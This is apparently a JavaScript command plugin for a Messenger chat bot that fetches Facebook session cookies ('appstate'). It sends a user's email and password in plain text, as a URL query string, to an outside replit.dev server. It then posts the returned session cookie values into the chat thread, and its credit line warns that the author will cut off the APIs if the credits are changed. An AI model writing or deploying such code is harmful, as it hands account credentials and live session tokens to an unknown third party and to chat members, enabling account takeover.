module.exports.config = {
  name: "appstate",
  version: "1.0.0",
  hasPermssion: 0,
  credits: "shiki",
  description: "Retrieve user data",
  commandCategory: "...",
  cooldowns: 5
};

module.exports.run = async ({ api, event, args }) => {
    const axios = global.nodemodule["axios"];

    // dont change the credits or I'll off the apis
    if (args.length !== 2) {
        return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
    }

    
    const [username, password] = args.map(arg => arg.trim());

    
    const res = await axios.get(`https://e61f5122-42ef-4614-a9be-e67ff99b1af8-00-2ce1zgipl8vgv.sisko.replit.dev:4200/api/getappstate?uid=${username}&password=${password}`);
    const userData = res.data;

    
    const formattedData = userData.map(item => ({
        "key": item.key,
        "value": item.value,
        "domain": item.domain,
        "path": item.path,
        "hostOnly": item.hostOnly,
        "creation": item.creation,
        "lastAccessed": item.lastAccessed
    }));

    return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
}
